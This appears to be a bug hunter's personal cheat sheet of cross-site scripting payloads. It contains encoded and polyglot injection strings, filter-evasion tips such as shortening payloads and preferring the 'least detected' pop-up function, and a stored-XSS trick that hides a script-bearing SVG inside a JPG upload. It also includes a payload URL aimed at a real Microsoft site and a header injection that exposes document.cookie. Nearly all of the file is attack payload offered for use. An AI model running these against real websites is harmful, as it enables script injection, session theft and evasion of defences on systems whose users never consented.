
--'`"><img src=x><script>alert(1)</script>{{7*7}}

#"><img src=M onerror=alert('XSS');>

veris-->group<svg/onload=alert(/XSS/)//

`<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`


`<BODY ONLOAD=alert('XSS')>`

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html




from miscrosoft bounty
d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g

# d1bvs</script><script>alert(`XSS`)</script>c579g      => encode upper payload



-   `http(s)://` can be shortened to `//` or `/\\` or `\\`.
-   `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
-   alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
-   You can use `//` to close a tag instead of `>`.
-   I have found that `confirm` is the least detected pop-up function so stop using `alert`.
-   Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
-   The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)




‘-confirm(document.domain)-‘      -> bouny


-----

Images accessible via this storage do not properly neutralize SVG files, which can contain XSS payloads. For example, uploading the following XML inside a JPG file will serve its contents as SVG.
That's can be stored xss
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="200" height="200" style="fill:rgb(0,255,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("Stored XSS!!");
   </script>
</svg>
```



[https://msrc.microsoft.com/blog/search/?query=<img/src/onerror=alert(`m3ez`)>](https://msrc.microsoft.com/blog/search/?query=%3Cimg/src/onerror=alert(`m3ez`)%3E)


X-Forwarded-Host: bing.com”>img src/onerror=prompt(document.cookie)>

